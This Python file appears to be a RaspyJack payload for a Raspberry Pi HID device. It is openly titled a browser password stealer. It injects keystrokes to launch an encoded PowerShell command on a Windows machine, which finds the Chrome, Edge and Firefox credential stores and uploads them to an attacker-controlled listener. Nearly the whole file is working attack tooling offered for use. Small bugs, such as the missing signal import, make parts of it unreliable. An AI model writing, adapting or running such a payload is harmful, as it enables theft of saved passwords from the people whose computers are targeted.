#!/usr/bin/env python3
"""
RaspyJack *payload* – **Evil: Browser Password DB Stealer (Windows)**
======================================================================
A HID attack that locates the password database files for common
Chromium-based browsers (Chrome, Edge) and Firefox on Windows, and
exfiltrates them to an attacker-controlled server.

The actual decryption of these files must be done offline on the
attacker's machine.

**NOTE:** This requires a listener to be running to receive the data.
"""

import os, sys, subprocess, time
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

# --- CONFIGURATION ---
LISTENER_IP = "192.168.1.100" # Default IP, will be configurable
LISTENER_PORT = "8000" # Default Port, will be configurable

# --- GPIO & LCD ---
PINS = { "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT = ImageFont.load_default()

# --- Globals & Shutdown ---
running = True
current_ip_input = LISTENER_IP # Initial value for IP input
ip_input_cursor_pos = 0 # Cursor position for IP input
current_port_input = LISTENER_PORT # Initial value for Port input
port_input_cursor_pos = 0 # Cursor position for Port input

def cleanup(*_):
    global running
    running = False

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# --- Display Functions ---
def show_message(lines, color="lime"):
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    font = FONT_TITLE # Use FONT_TITLE for messages
    y = 40
    for line in lines:
        bbox = d.textbbox((0, 0), line, font=font)
        w, h = bbox[2] - bbox[0], bbox[3] - bbox[1]
        x = (128 - w) // 2
        d.text((x, y), line, font=font, fill=color)
        y += h + 5
    LCD.LCD_ShowImage(img, 0, 0)

def draw_ui(screen_state="main"):
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "Browser Pass Stealer", font=FONT_TITLE, fill="#FF0000")
    d.line([(0, 22), (128, 22)], fill="#FF0000", width=1)
    
    if screen_state == "main":
        d.text((5, 30), "Listener IP:", font=FONT, fill="white")
        d.text((5, 45), LISTENER_IP, font=FONT_TITLE, fill="yellow")
        d.text((5, 65), "Listener Port:", font=FONT, fill="white")
        d.text((5, 80), LISTENER_PORT, font=FONT_TITLE, fill="yellow")
        d.text((5, 115), "OK=Start | KEY3=Exit", font=FONT, fill="cyan")
    elif screen_state == "ip_input":
        d.text((5, 30), "Enter Listener IP:", font=FONT, fill="white")
        display_ip = list(current_ip_input)
        if ip_input_cursor_pos < len(display_ip):
            display_ip[ip_input_cursor_pos] = '_'
        d.text((5, 50), "".join(display_ip), font=FONT_TITLE, fill="yellow")
        d.text((5, 115), "UP/DOWN=Digit | LEFT/RIGHT=Move | OK=Confirm", font=FONT, fill="cyan")
    elif screen_state == "port_input":
        d.text((5, 30), "Enter Listener Port:", font=FONT, fill="white")
        display_port = list(current_port_input)
        if port_input_cursor_pos < len(display_port):
            display_port[port_input_cursor_pos] = '_'
        d.text((5, 50), "".join(display_port), font=FONT_TITLE, fill="yellow")
        d.text((5, 115), "UP/DOWN=Digit | LEFT/RIGHT=Move | OK=Confirm", font=FONT, fill="cyan")
    elif screen_state == "attacking":
        d.text((5, 50), "Injecting PowerShell...", font=FONT_TITLE, fill="yellow")
        d.text((5, 70), f"To: {LISTENER_IP}:{LISTENER_PORT}", font=FONT, fill="white")
        d.text((5, 115), "KEY3=Stop", font=FONT, fill="cyan")
    elif screen_state == "success":
        d.text((5, 50), "Attack Sent!", font=FONT_TITLE, fill="lime")
        d.text((5, 70), "Check listener", font=FONT, fill="white")
        d.text((5, 115), "KEY3=Exit", font=FONT, fill="cyan")
    elif screen_state == "failed":
        d.text((5, 50), "Attack FAILED!", font=FONT_TITLE, fill="red")
        d.text((5, 70), "Check console.", font=FONT, fill="white")
        d.text((5, 115), "KEY3=Exit", font=FONT, fill="cyan")
    
    LCD.LCD_ShowImage(img, 0, 0)

def handle_ip_input():
    global current_ip_input, ip_input_cursor_pos
    
    ip_segments = current_ip_input.split('.')
    if len(ip_segments) != 4: # Reset if invalid format
        ip_segments = ["192", "168", "1", "100"]
        current_ip_input = ".".join(ip_segments)
    
    draw_ui("ip_input")
    
    while running:
        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                btn = name
                while GPIO.input(pin) == 0: # Debounce
                    time.sleep(0.05)
                break
        
        if btn == "KEY3": # Cancel IP input
            return False
        
        if btn == "OK": # Confirm IP
            # Validate IP format
            parts = current_ip_input.split('.')
            if len(parts) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
                return True
            else:
                show_message(["Invalid IP!", "Try again."], "red")
                time.sleep(2)
                current_ip_input = "192.168.1.100" # Reset to default
                ip_input_cursor_pos = 0
                draw_ui("ip_input")
        
        if btn == "LEFT":
            ip_input_cursor_pos = max(0, ip_input_cursor_pos - 1)
            draw_ui("ip_input")
        elif btn == "RIGHT":
            ip_input_cursor_pos = min(len(current_ip_input), ip_input_cursor_pos + 1)
            draw_ui("ip_input")
        elif btn == "UP" or btn == "DOWN":
            if ip_input_cursor_pos < len(current_ip_input):
                char_list = list(current_ip_input)
                current_char = char_list[ip_input_cursor_pos]
                
                if current_char.isdigit():
                    digit = int(current_char)
                    if btn == "UP":
                        digit = (digit + 1) % 10
                    else: # DOWN
                        digit = (digit - 1 + 10) % 10
                    char_list[ip_input_cursor_pos] = str(digit)
                    current_ip_input = "".join(char_list)
                elif current_char == '.':
                    # Cannot change dot, move cursor
                    if btn == "UP":
                        ip_input_cursor_pos = min(len(current_ip_input), ip_input_cursor_pos + 1)
                    else:
                        ip_input_cursor_pos = max(0, ip_input_cursor_pos - 1)
                draw_ui("ip_input")
        
        time.sleep(0.1)
    return False

def handle_port_input():
    global current_port_input, port_input_cursor_pos
    
    draw_ui("port_input")
    
    while running:
        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                btn = name
                while GPIO.input(pin) == 0: # Debounce
                    time.sleep(0.05)
                break
        
        if btn == "KEY3": # Cancel Port input
            return False
        
        if btn == "OK": # Confirm Port
            if current_port_input.isdigit() and 1 <= int(current_port_input) <= 65535:
                return True
            else:
                show_message(["Invalid Port!", "Try again."], "red")
                time.sleep(2)
                current_port_input = "8000" # Reset to default
                port_input_cursor_pos = 0
                draw_ui("port_input")
        
        if btn == "LEFT":
            port_input_cursor_pos = max(0, port_input_cursor_pos - 1)
            draw_ui("port_input")
        elif btn == "RIGHT":
            port_input_cursor_pos = min(len(current_port_input), port_input_cursor_pos + 1)
            draw_ui("port_input")
        elif btn == "UP" or btn == "DOWN":
            if port_input_cursor_pos < len(current_port_input):
                char_list = list(current_port_input)
                current_char = char_list[port_input_cursor_pos]
                
                if current_char.isdigit():
                    digit = int(current_char)
                    if btn == "UP":
                        digit = (digit + 1) % 10
                    else: # DOWN
                        digit = (digit - 1 + 10) % 10
                    char_list[port_input_cursor_pos] = str(digit)
                    current_port_input = "".join(char_list)
                draw_ui("port_input")
        
        time.sleep(0.1)
    return False

# --- Main Attack Logic ---
def run_attack():
    global LISTENER_IP, LISTENER_PORT
    
    draw_ui("attacking")
    
    if subprocess.run("which P4wnP1_cli", shell=True, capture_output=True).returncode != 0:
        show_message(["ERROR:", "P4wnP1_cli", "not found!"], "red")
        time.sleep(3)
        return False

    # PowerShell script to find and upload browser DBs
    ps_script = f"""
$paths = @(
    "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data",
    "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data",
    "$env:APPDATA\\Mozilla\\Firefox\\Profiles\\*.default-release\\logins.json",
    "$env:APPDATA\\Mozilla\\Firefox\\Profiles\\*.default-release\\key4.db"
)
foreach ($path in $paths) {{
    $resolved = Resolve-Path $path -ErrorAction SilentlyContinue
    if ($resolved) {{
        $file = $resolved.Path
        $filename = Split-Path $file -Leaf
        $uri = "http://{LISTENER_IP}:{LISTENER_PORT}/$filename"
        try {{
            Invoke-RestMethod -Uri $uri -Method Post -InFile $file
        }} catch {{}}
    }}
}}
"""
    # The script is complex, so we'll download and execute it
    ps_command_b64 = "powershell -e " + subprocess.check_output(f"echo '{ps_script}' | iconv -t UTF-16LE | base64 -w 0", shell=True).decode().strip()

    script = f"""
GUI r
delay(500)
type("powershell")
delay(200)
press("ENTER")
delay(750)
type("{ps_command_b64}")
delay(200)
press("ENTER")
delay(3000)
type("exit")
press("ENTER")
"""
    
    cli_command = f"P4wnP1_cli hid job -c '{script}'"
    
    try:
        subprocess.run(cli_command, shell=True, check=True, timeout=45)
        draw_ui("success")
        return True
    except Exception as e:
        print(f"Error running HID attack: {e}", file=sys.stderr)
        draw_ui("failed")
        return False

# --- Execution ---
if __name__ == '__main__':
    current_screen = "main"
    try:
        while running:
            if current_screen == "main":
                draw_ui("main")
                
                if GPIO.input(PINS["KEY3"]) == 0:
                    cleanup()
                    break
                
                if GPIO.input(PINS["OK"]) == 0:
                    current_screen = "ip_input"
                    time.sleep(0.3) # Debounce
            
            elif current_screen == "ip_input":
                if handle_ip_input():
                    LISTENER_IP = current_ip_input
                    current_screen = "port_input"
                else:
                    current_screen = "main"
                time.sleep(0.3) # Debounce
            
            elif current_screen == "port_input":
                if handle_port_input():
                    LISTENER_PORT = current_port_input
                    if run_attack():
                        time.sleep(3) # Display success/failure
                    current_screen = "main"
                else:
                    current_screen = "main"
                time.sleep(0.3) # Debounce
            
            time.sleep(0.1)
            
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("Browser Password Stealer payload finished.")
